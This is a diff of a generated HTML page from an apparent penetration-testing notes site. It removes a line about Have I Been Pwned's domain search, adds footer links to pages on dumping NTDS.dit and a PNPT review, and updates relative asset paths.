-<li><strong>Resource</strong>: <strong><code>Have I Been Pwned?</code></strong> offers a domain search feature that allows administrators to see all email addresses from their domain that have appeared in publicly known data breaches. This is a legitimate service for defensive purposes but illustrates how breach data can be used.</li>
-</ul>
+</ol>
 
 
 
@@ -1419,6 +1557,44 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../dump-ntds.dit/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Dumping the NTDS.dit">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Dumping the NTDS.dit
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../blog/posts/2025-10-22-pnpt-review/" class="md-footer__link md-footer__link--next" aria-label="Next: PNPT Review">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                PNPT Review
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
@@ -1479,10 +1655,10 @@
       
       
       
-      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.expand","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.tabs","navigation.top","navigation.tracking","search.highlight"],"search":"../../assets/javascripts/workers/search.1bfe1b73.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.expand","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.tabs","navigation.top","navigation.tracking","search.highlight"],"search":"../../../assets/javascripts/workers/search.1bfe1b73.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.6008f134.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.6008f134.min.js"></script>
       
     
   </body>
